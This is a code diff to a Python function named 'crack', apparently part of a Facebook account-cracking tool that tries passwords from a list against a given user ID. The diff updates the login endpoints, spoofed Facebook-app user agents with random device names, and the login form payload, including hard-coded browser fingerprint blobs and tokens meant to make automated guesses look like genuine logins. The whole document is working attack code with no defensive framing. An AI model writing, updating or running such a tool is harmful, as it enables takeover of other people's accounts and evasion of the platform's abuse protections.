@@ -155,7 +155,7 @@ def crack(uid, password_list, total_count):
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
+            url1 = "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
             head = {"authority": "m.prod.facebook.com",
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -171,34 +171,26 @@ def crack(uid, password_list, total_count):
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)
             log_data = {
-            'm_ts':re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1),
-            'li':re.search('name="li" value="(.*?)"',str(requu1.text)).group(1),
-            'try_number':'0',
-            'unrecognized_tries':'0',
-            'email':uid,
-            'prefill_contact_point':uid,
-            'prefill_source':'browser_dropdown',
-            'prefill_type':'password',
-            'first_prefill_source':'browser_dropdown',
-            'first_prefill_type':'contact_point',
-            'had_cp_prefilled':'true',
-            'had_password_prefilled':'true',
-            'is_smart_lock':'false',
-            'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requu1.text)).group(1),
-            'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requu1.text)).group(1),
-            'jazoest':re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            'lsd':re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
-            '__dyn':'',
-            '__csr':'',
-            '__req':random.choice(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
-            '__fmt':'1',
-            '__a':re.search('"encrypted":"(.*?)"',str(requu1.text)).group(1),
-            '__user':'0'
-            }
-            url = "https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            headers = {"authority": "www.facebook.com",
+            'email': uid,
+            'cuid': 'AYg-Zk3oBYS1IvkNsDBz-LJWCgiozUvirKReZ1dxv4ymdNH3-gkKiiEuQ3_Rpg2-uoR7dwTRnmUx9szEXe_sejzDUnWbSwZwAuHZk3vAOeLkUW_b-pZaVzxEfnOd8x6lbr-fj70m99RHpZ6fC6rmgYN1e_QBicJQHFf1syDbJj7I6fAxI9NAVX3N3s1Wl4txmUyFCGnqZ85kbHXGeJLvDbcbpXcjPc4TC4itvKF1DUZiMVg00N_n-VYTcff5UAZ9mCg',
+            'guid': 'ffcc6be62735888e9',
+            'lgnjs': '1765922875',
+            'lgnrnd': '140753__cXd',
+            'locale': 'en_GB',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/logiy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzY1OTIyODUwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%253D%253D&next',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AZMZAAAAAFAA',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc2NTkyMjg3Ni4xODgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp7InciOjExMDUsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzY1OTIyODc2LjIzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzY1OTIyODc2LjE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzY1OTIyODc2LjIwNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3NjU5MjI4NzYuMjA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc2NTkyMjg3Ni4yMDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjV9XSwiMzAxMDYiOlt7InQiOjE3NjU5MjI4NzYuMTg0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ZmFsc2V9LHsidCI6MTc2NTkyMjg3Ni4yMjgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzY1OTIyODc2LjE4NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOmZhbHNlfV19',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}
+            url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1"
+            headers = {"authority": "web.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
             "scheme": "https",
@@ -208,8 +200,8 @@ def crack(uid, password_list, total_count):
             "cache-control": "max-age=0",
             "content-type": "application/x-www-form-urlencoded",
             "dpr": "3",
-            "origin": "https://www.facebook.com",
-            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "origin": "https://web.facebook.com",
+            "referer": "https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
             "sec-ch-prefers-color-scheme": "light",
             "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
             "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
